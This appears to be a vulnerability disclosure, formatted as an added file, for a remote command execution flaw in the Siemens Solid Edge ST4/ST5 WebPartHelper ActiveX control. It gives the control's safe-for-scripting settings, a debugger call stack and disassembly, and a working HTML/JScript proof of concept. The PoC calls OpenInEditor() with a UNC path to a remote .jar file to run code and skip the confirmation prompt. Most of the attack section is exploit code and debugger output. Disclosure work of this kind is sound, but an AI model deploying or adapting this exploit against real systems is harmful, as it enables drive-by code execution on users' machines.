@@ -1,0 +1,133 @@
+SIEMENS Solid Edge ST4/ST5 WebPartHelper ActiveX Control 
+RFMSsvs!JShellExecuteEx Remote Command Execution 
+
+Tested against: Microsoft Windows Server 2003 r2 sp2
+                Microsoft Windows XP sp3
+                Microsoft Windows 7
+                Internet Explorer 8
+
+Software description: http://en.wikipedia.org/wiki/Solid_Edge
+
+vendor site: http://www.siemens.com/entry/cc/en/
+
+Download url: http://www.plm.automation.siemens.com/en_us/products/velocity/forms/solid-edge-student.cfm
+
+File tested: SolidEdgeV104ENGLISH_32Bit.exe
+
+Background:
+
+The mentioned software installs an ActiveX control with 
+the following settings:
+
+CLSID: {DD568718-FF20-48EA-973F-0BD5C9FCA522}
+Progid: SolidEdge.WebPartHelper.1
+Binary Path: C:\Program Files\Solid Edge ST4\Program\WPHelper.dll
+Implements IObjectSafety: True
+Safe For Initialization (IObjectSafety): False
+Safe For Scripting (IObjectSafety): True
+
+This control *implements* IObjectSafety: IE will query through the IObjectSafety
+interface for "Safe for Initialization with data" and "Safe For Scripting".
+
+According to IObjectSafety interface, this control is Safe for Scripting 
+then IE  will allow scripting of this control according to browser
+security settings.
+
+vulnerability:
+
+the WebPartHelper Class offers the OpenInEditor() method, see typelib:
+
+...
+  /* DISPID=8 */
+function OpenInEditor(
+        /* VT_VARIANT [12] [in] */ $URL
+        )
+{
+}
+...
+
+By passing an null session share path to the URL argument of this method
+is possible to launch an arbitrary executable.
+
+This is because of a ShellExecuteExW() call inside RFMSsvs.dll
+
+Call stack when ShellExecuteExW() is called:
+
+Address    Stack      Procedure / arguments                 Called from                   Frame
+01B7E140   04AC9F0E   SHELL32.ShellExecuteExW               RFMSsvs.04AC9F08              01B7F280
+01B7F284   022B71AD   ? <jmp.&RFMSsvs.JShellExecuteEx>      WPHelper.022B71A8             01B7F280
+01B7F560   022B85B6   WPHelper.022B6D70                     WPHelper.022B85B1             01B7F55C
+01B7F5D4   022B87A5   ? WPHelper.022B8380                   WPHelper.022B87A0             01B7F5D0
+01B7F620   022B89CB   WPHelper.022B8710                     WPHelper.022B89C6             01B7F61C
+01B7F668   7D0E5186   Includes WPHelper.022B89CB            OLEAUT32.7D0E5184             01B7F664
+01B7F690   7D0F4ACF   ? OLEAUT32.DispCallFunc               OLEAUT32.7D0F4ACA             01B7F68C
+01B7F720   022B58C3   Includes OLEAUT32.7D0F4ACF            WPHelper.022B58C1             01B7F71C
+01B7F748   40302C02   Includes WPHelper.022B58C3            jscript.40302BFF              01B7F744
+01B7F784   40302B6F   jscript.40302B90                      jscript.40302B6A              01B7F780
+01B7F7C0   40302AFA   jscript.40302B2E                      jscript.40302AF5              01B7F7BC
+01B7F834   40303555   ? jscript.40302A88                    jscript.40303550              01B7F830
+01B7F878   40301221   jscript.4030122A                      jscript.4030121C              01B7F874
+01B7F8B8   403011D6   jscript.403011E1                      jscript.403011D1              01B7F8B4
+01B7F8DC   4030312D   jscript.40301182                      jscript.40303128              01B7F8D8
+
+
+WPHelper.dll:
+...
+022B718A   899D 74FDFFFF    mov dword ptr ss:[ebp-28C],ebx
+022B7190   8D85 D8FDFFFF    lea eax,dword ptr ss:[ebp-228]
+022B7196   50               push eax
+022B7197   8D8D 60FDFFFF    lea ecx,dword ptr ss:[ebp-2A0]
+022B719D   51               push ecx
+022B719E   C785 7CFDFFFF 01>mov dword ptr ss:[ebp-284],1
+022B71A8   E8 ADBB0100      call <jmp.&RFMSsvs.JShellExecuteEx>
+...
+
+
+RFMSsvs.dll:
+...
+04AC9ECF   8B85 A4EFFFFF    mov eax,dword ptr ss:[ebp-105C]
+04AC9ED5   8D8D 4CEFFFFF    lea ecx,dword ptr ss:[ebp-10B4]
+04AC9EDB   8946 24          mov dword ptr ds:[esi+24],eax
+04AC9EDE   FF15 0CE3CB04    call dword ptr ds:[<&JUtil.??BGUserText@@QBEPB_WXZ>]                    ; JUtil.??BGUserText@@QBEPB_WXZ
+04AC9EE4   8946 10          mov dword ptr ds:[esi+10],eax
+04AC9EE7   C645 FC 02       mov byte ptr ss:[ebp-4],2
+04AC9EEB   8D8D D8EEFFFF    lea ecx,dword ptr ss:[ebp-1128]
+04AC9EF1   E8 6A89F1FF      call RFMSsvs.??1JrfmsFileName@@QAE@XZ
+04AC9EF6   EB 0F            jmp short RFMSsvs.04AC9F07
+04AC9EF8   8D8D 84EFFFFF    lea ecx,dword ptr ss:[ebp-107C]
+04AC9EFE   FF15 0CE3CB04    call dword ptr ds:[<&JUtil.??BGUserText@@QBEPB_WXZ>]                    ; JUtil.??BGUserText@@QBEPB_WXZ
+04AC9F04   8946 10          mov dword ptr ds:[esi+10],eax        ; eax -> "\\192.168.2.100\uncshare\CmdExec.jar"
+04AC9F07   56               push esi
+04AC9F08   FF15 E8E6CB04    call dword ptr ds:[<&SHELL32.ShellExecuteExW>]                          ; SHELL32.ShellExecuteExW
+...
+
+As attachment, proof of concept code.
+Note that by pointing OpenInEditor() (and consequently ShellExecuteExW() ) 
+to a remote .jar file as handled in JRE/JDK7u21 is possible to bypass
+the usual confirmation box.
+
+<!--
+SIEMENS Solid Edge WebPartHelper ActiveX Control RFMSsvs!JShellExecuteEx
+Remote Command Execution PoC
+
+CLSID: {DD568718-FF20-48EA-973F-0BD5C9FCA522}
+Progid: SolidEdge.WebPartHelper.1
+Binary Path: C:\Program Files\Solid Edge ST4\Program\WPHelper.dll
+Implements IObjectSafety: True
+Safe For Initialization (IObjectSafety): False
+Safe For Scripting (IObjectSafety): True
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<script>
+
+  var obj = new ActiveXObject("SolidEdge.WebPartHelper.1");
+   
+  //launch calc.exe
+  //obj.OpenInEditor("c:\\windows\\system32\\calc.exe");
+
+  //bypass the confirmation box, JRE/JDK7u21
+  obj.OpenInEditor("\\\\192.168.0.1\\uncshare\\CmdExec.jar");
+
+
+</script>
